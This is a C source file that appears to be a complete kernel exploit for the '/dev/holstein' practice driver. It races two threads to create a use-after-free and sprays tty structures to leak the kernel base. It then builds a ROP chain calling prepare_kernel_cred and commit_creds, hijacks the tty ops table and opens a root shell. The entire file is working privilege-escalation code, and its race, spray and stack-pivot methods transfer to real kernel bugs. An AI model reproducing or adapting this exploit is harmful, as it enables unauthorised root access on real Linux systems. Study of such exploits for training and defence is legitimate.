#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/syscall.h>
#include <pthread.h>
#include <sched.h>

#define pop_rdi (kbase + 0xb13c5) // pop rdi ; ret
#define prepare_kernel_cred (kbase + 0x72580)
#define commit_creds (kbase + 0x723e0)
#define mov_rdi_rax_rep_movsq (kbase + 0x65094b) // mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret
#define pop_rcx (kbase + 0xc6bfe0) // pop rcx ; ret
#define kpti_trampoline (kbase + 0x800e26) // skip POP_REGS macro
#define push_rdx_pop_rsp_xor_dptr_rax_eax_pop_rbx_r12_rbp (kbase + 0x344fba) // push rdx ; pop rsp ; xor dword ptr [rax], eax ; pop rbx ; pop r12 ; pop rbp ; ret
 
int fd1, fd2;
long long user_cs, user_rflags, user_rsp, user_ss;

void shell() {
    if (getuid() == 0) {
        puts("[+] Got root");
        system("/bin/sh");
    }
}

// Wrapper around syscall to get thread id
pid_t gettid(void) {
    return syscall(SYS_gettid);
}

int win = 0;
void* race_fd(void *arg) {
    // Limit thread to one CPU
    cpu_set_t *cpu_set = (cpu_set_t*)arg;
    if (sched_setaffinity(gettid(), sizeof(cpu_set_t), cpu_set)) {
        perror("sched_setaffinity error");
    }

    while (1) {
        while (!win) {
            int fd = open("/dev/holstein", O_RDWR);
            if (fd == fd2) {
                win = 1;
            }
            if (win == 0 && fd == fd1) {
                close(fd);
            }
        }
        // Other thread can still close fd, sanity check
        if (write(fd1, "A", 1) != 1 || write(fd2, "a", 1) != 1) {
            close(fd1);
            close(fd2);
            win = 0;
        } else {
            // All good
            break;
        }
    }
    return NULL;
}

void* spray_thread(void *arg) {
    long x;
    long spray[800];

    // Limit thread to one CPU
    cpu_set_t *cpu_set = (cpu_set_t*)arg;
    if (sched_setaffinity(gettid(), sizeof(cpu_set_t), cpu_set)) {
        perror("sched_setaffinity error");
    }

    for (int i = 0; i < 800; i++) {
        usleep(10);

        spray[i] = open("/dev/ptmx", O_RDONLY | O_WRONLY);
        // If spray fails close all handles and return
        if (spray[i] == -1) {
            puts("[-] FAIL spray");
            for (int j = 0; j < i; j++) {
                close(spray[j]);
            }
            return (void*)-1;
        }

        // Check if spray hit the UAF area
        if (read(fd2, &x, sizeof(long)) == sizeof(long) && x == 0x100005401) {
            printf("[+] Spray hit! x=0x%lx\n", x);
            // Close all other handles
            for (int j = 0; j < i; j++) {
                close(spray[j]);
            }
            // Return fd that controls UAF area
            return (void*)spray[i];
        }
    }
    for (int i = 0; i < 800; i++) {
        close(spray[i]);
    }
    puts("[+] Spray did not hit");

    return (void*)-1;
}

int trigger_race_condition_uaf() {
    pthread_t th1, th2;
    long victim_fd = -1;
    long x;

    cpu_set_t t1_cpu, t2_cpu;

    // Create CPU set
    CPU_ZERO(&t1_cpu);
    CPU_ZERO(&t2_cpu);
    CPU_SET(0, &t1_cpu);
    CPU_SET(1, &t2_cpu);

    // Check which fd will be assigned after UAF and assign them automatically
    fd1 = open("/tmp", O_RDONLY);
    fd2 = open("/tmp", O_RDONLY);
    close(fd1);
    close(fd2);
    printf("[+] fd1=%d, fd2=%d\n", fd1, fd2);

    // Race
    pthread_create(&th1, NULL, race_fd, (void*)&t1_cpu);
    pthread_create(&th2, NULL, race_fd, (void*)&t2_cpu);
    pthread_join(th1, NULL);
    pthread_join(th2, NULL);

    // Sanity check
    char buf[0x100];
    write(fd1, "Hello, World!", 14);
    read(fd2, buf, 14);
    if (strcmp(buf, "Hello, World!") != 0) {
        puts("[-] Bad luck!");
        exit(1);
    }

    memset(buf, 0, 14);
    write(fd1, buf, 14);

    // UAF
    close(fd1);

    victim_fd = (long)spray_thread((void*)&t1_cpu);

    //while(victim_fd == -1 || x != 0x100005401) {
    while(victim_fd == -1) {
        puts("[+] Spraying on another CPU...");
        pthread_create(&th1, NULL, spray_thread, &t2_cpu);
        pthread_join(th1, (void*)&victim_fd);
        read(fd2, &x, sizeof(long));
    }

    printf("[+] Spray successful! victim_fd=%d\n", (int)victim_fd);
    return victim_fd;
}

int main() {
    char buf[0x400];

    trigger_race_condition_uaf();

    // Leak
    read(fd2, buf, 0x400);
    /*
    for (int i = 0; i < 0x400/8; i++) {
        printf("0x%llx\n", ((long long*)&buf)[i]);
    }
    */

    long long kbase = ((long long*)&buf)[73] - 0x332da0;
    long long g_buf = ((long long*)&buf)[7] - 0x38;

    // Sanity check in gdb
    //long long test = 0xcafebabecafebabe;
    //write(fd2, &test, 8);

    printf("[+] leaked kbase = 0x%llx\n", kbase);
    printf("[+] leaked g_buf = 0x%llx\n", g_buf);

    // Save state
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_rsp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );

    // Reuse the opened fd2 to store ROP chain
    long long* chain = (long long*)&buf;
    *chain++ = pop_rdi;
    *chain++ = 0;
    *chain++ = prepare_kernel_cred;
    *chain++ = pop_rcx;
    *chain++ = 0;
    *chain++ = mov_rdi_rax_rep_movsq;
    *chain++ = commit_creds;
    *chain++ = kpti_trampoline;
    *chain++ = 0;
    *chain++ = 0;
    *chain++ = (long long)shell;
    *chain++ = user_cs;
    *chain++ = user_rflags;
    *chain++ = user_rsp;
    *chain++ = user_ss;

    // Create fake ops function table after the current tty_struct
    *(long long*)&buf[0x3f8] = push_rdx_pop_rsp_xor_dptr_rax_eax_pop_rbx_r12_rbp;

    write(fd2, buf, 0x400);

    // Second UAF to trigger jump to ROP chain
    int victim_fd = trigger_race_condition_uaf();

    read(fd2, buf, 0x20);
    // Overwrite *ops
    *(long long*)&buf[0x18] = g_buf + 0x3f8 - 12*8;
    write(fd2, buf, 0x20);

    // Trigger the jump
    ioctl(victim_fd, 0, g_buf - 8*4); // Account for pop rbx r12 rbp + instruction

    puts("[-] Exploit failed :(");

    return 0;
}